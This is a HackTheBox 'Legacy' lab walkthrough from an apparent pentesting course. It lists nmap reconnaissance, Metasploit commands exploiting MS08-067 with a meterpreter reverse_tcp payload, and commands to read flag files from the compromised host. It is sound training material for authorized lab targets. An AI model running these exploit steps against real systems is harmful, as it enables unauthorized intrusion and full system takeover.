# Lab 08: HackTheBox - Legacy

[⬅️ Previous](Lab-07-Advanced-Track-HTB-Lame.md) | [🏠 Path Home](Home.md)

---

## 🎯 Lab Objective
Exploit MS08-067 or MS17-010 to get SYSTEM on HTB Legacy.

## 🌐 Direct Lab Access
- HTB Machine: https://app.hackthebox.com/machines/Legacy

---

## 📝 Walkthrough

### 1. Nmap Scan
```bash
nmap -p- -sV -sC -O 10.10.10.4 -oN legacy_nmap.txt
```

### 2. Exploit MS08-067
```bash
msfconsole -q
search ms08-067
use exploit/windows/smb/ms08_067_netapi
set RHOSTS 10.10.10.4
set PAYLOAD windows/meterpreter/reverse_tcp
set LHOST tun0
exploit
```

### 3. Get Flags
```bash
cat "C:\Documents and Settings\Administrator\Desktop\root.txt"
cat "C:\Documents and Settings\john\Desktop\user.txt"
```

---

## 🔗 Additional Resources
- HTB Legacy Writeups: https://www.hackthebox.com/machines/legacy

---

[⬅️ Previous](Lab-07-Advanced-Track-HTB-Lame.md) | [🏠 Path Home](Home.md)
